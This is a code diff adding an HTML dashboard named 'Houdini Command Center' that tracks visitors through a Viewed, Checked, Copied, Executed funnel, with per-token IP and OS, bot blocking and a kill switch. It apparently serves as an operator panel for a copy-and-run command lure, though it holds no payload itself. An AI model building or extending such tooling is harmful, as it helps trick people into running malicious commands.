@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Houdini — Command Center</title>
+    <link rel="stylesheet" href="/dashboard/style.css">
+</head>
+<body>
+    <header>
+        <h1>🎩 Houdini <span style="color:#94a3b8;font-size:14px;">Command Center</span></h1>
+        <div class="status">
+            <div class="status-dot" id="status-dot"></div>
+            <span id="status-text">Operational</span>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>Total Views</h3>
+                <div class="value" id="stat-total">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Executed</h3>
+                <div class="value" id="stat-executed">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Conversion</h3>
+                <div class="value" id="stat-conversion">0%</div>
+            </div>
+            <div class="stat-card">
+                <h3>Bots Blocked</h3>
+                <div class="value" id="stat-bots">0</div>
+            </div>
+        </div>
+        
+        <div class="controls">
+            <button class="btn btn-kill" id="kill-btn">☠ ACTIVATE KILL SWITCH</button>
+            <button class="btn btn-refresh" id="refresh-btn">↻ Refresh Data</button>
+            <span style="margin-left:auto;color:#94a3b8;font-size:12px;">Auto-updates every 2s via WebSocket</span>
+        </div>
+        
+        <div class="funnel">
+            <h2>Conversion Funnel</h2>
+            <div class="funnel-bar">
+                <div class="funnel-segment viewed" id="funnel-viewed" style="width:100%">0</div>
+                <div class="funnel-segment checked" id="funnel-checked" style="width:0%">0</div>
+                <div class="funnel-segment copied" id="funnel-copied" style="width:0%">0</div>
+                <div class="funnel-segment executed" id="funnel-executed" style="width:0%">0</div>
+            </div>
+            <div class="funnel-legend">
+                <span><div class="dot" style="background:#3b82f6"></div> Viewed</span>
+                <span><div class="dot" style="background:#8b5cf6"></div> Checked</span>
+                <span><div class="dot" style="background:#f59e0b"></div> Copied</span>
+                <span><div class="dot" style="background:#22c55e"></div> Executed</span>
+            </div>
+        </div>
+        
+        <table>
+            <thead>
+                <tr>
+                    <th>Token</th>
+                    <th>IP</th>
+                    <th>OS</th>
+                    <th>Status</th>
+                    <th>Stages</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody id="tokens-body">
+                <tr><td colspan="6" style="text-align:center;color:#64748b">Loading...</td></tr>
+            </tbody>
+        </table>
+    </div>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/dashboard/app.js"></script>
+</body>
+</html>
